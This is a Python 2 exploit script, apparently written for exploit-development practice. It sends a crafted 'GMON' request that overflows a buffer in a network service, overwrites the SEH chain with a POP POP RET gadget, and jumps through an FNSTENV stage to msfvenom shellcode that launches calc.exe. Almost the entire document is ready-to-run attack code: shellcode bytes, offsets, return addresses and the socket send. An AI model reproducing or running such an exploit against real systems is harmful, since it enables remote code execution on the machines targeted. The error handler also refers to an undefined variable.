#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()
 
host = sys.argv[1]    
port = int(sys.argv[2])

# msfvenom -p windows/exec cmd=calc.exe -v shellcode -f python -b '\x00\x0a\x0d'
# Size 220 bytes
shellcode =  ""
shellcode += "\xbb\x0e\xfc\x2c\xe1\xda\xc7\xd9\x74\x24\xf4\x58"
shellcode += "\x2b\xc9\xb1\x31\x83\xe8\xfc\x31\x58\x0f\x03\x58"
shellcode += "\x01\x1e\xd9\x1d\xf5\x5c\x22\xde\x05\x01\xaa\x3b"
shellcode += "\x34\x01\xc8\x48\x66\xb1\x9a\x1d\x8a\x3a\xce\xb5"
shellcode += "\x19\x4e\xc7\xba\xaa\xe5\x31\xf4\x2b\x55\x01\x97"
shellcode += "\xaf\xa4\x56\x77\x8e\x66\xab\x76\xd7\x9b\x46\x2a"
shellcode += "\x80\xd0\xf5\xdb\xa5\xad\xc5\x50\xf5\x20\x4e\x84"
shellcode += "\x4d\x42\x7f\x1b\xc6\x1d\x5f\x9d\x0b\x16\xd6\x85"
shellcode += "\x48\x13\xa0\x3e\xba\xef\x33\x97\xf3\x10\x9f\xd6"
shellcode += "\x3c\xe3\xe1\x1f\xfa\x1c\x94\x69\xf9\xa1\xaf\xad"
shellcode += "\x80\x7d\x25\x36\x22\xf5\x9d\x92\xd3\xda\x78\x50"
shellcode += "\xdf\x97\x0f\x3e\xc3\x26\xc3\x34\xff\xa3\xe2\x9a"
shellcode += "\x76\xf7\xc0\x3e\xd3\xa3\x69\x66\xb9\x02\x95\x78"
shellcode += "\x62\xfa\x33\xf2\x8e\xef\x49\x59\xc4\xee\xdc\xe7"
shellcode += "\xaa\xf1\xde\xe7\x9a\x99\xef\x6c\x75\xdd\xef\xa6"
shellcode += "\x32\x11\xba\xeb\x12\xba\x63\x7e\x27\xa7\x93\x54"
shellcode += "\x6b\xde\x17\x5d\x13\x25\x07\x14\x16\x61\x8f\xc4"
shellcode += "\x6a\xfa\x7a\xeb\xd9\xfb\xae\x88\xbc\x6f\x32\x61"
shellcode += "\x5b\x08\xd1\x7d"

# Maximum length
maxlen = 5000
# Space to get to NSEH
nseh = 3525
# Same, SEH
seh = nseh + 4
# Space used after JMP ECX of the stage1 shellcode
stage2 = 3035

# Obtain control over EIP (Aaron Adams) by using FNSTENV to save state of FPU environment
stage1 = "\xd9\xee\xd9\x74\x24\xf4\x59\x80\xc1\x0a\x90\xfe\xcd\xfe\xcd\xff\xe1"

# Triggers crash
prefix = "/" * 10
# Fill until stage1 returns to here
fill1 = "A" * stage2
# Nopping
nop1 = "\x90" * 16
# Filling the gap between filler, return point of stage1 and shellcode
fill2 = "B" * (nseh - len(fill1 + shellcode + nop1))

# Addresses
crash_nseh = struct.pack("<L", 0x05700771)    # JNO SHORT 0x9 # JO SHORT 0x7
crash_seh = struct.pack("<L", 0x625010B4)     # POP r32 # POP r32 # RET

# Nopping
nop2 = "\x90" * 4
# Filling the last part
fill3 = "C" * (maxlen - len(prefix + fill1 + nop1 + shellcode + fill2 + crash_nseh + crash_seh + nop2 + stage1))

# Construct payload in following order
payload = prefix + fill1 + nop1 + shellcode + fill2 + crash_nseh + crash_seh + nop2 + stage1 + fill3

print "[+] Connecting to " + host + "\n"

try:
        print "[+] Fuzzing with " + str(len(payload)) + " length message..."

        req = (
                "GMON " +
                payload +
                "\r\n"
        )
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.send(req)
        s.recv(1024)
        s.close()

        time.sleep(0.1)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(craftedreq))
        sys.exit()


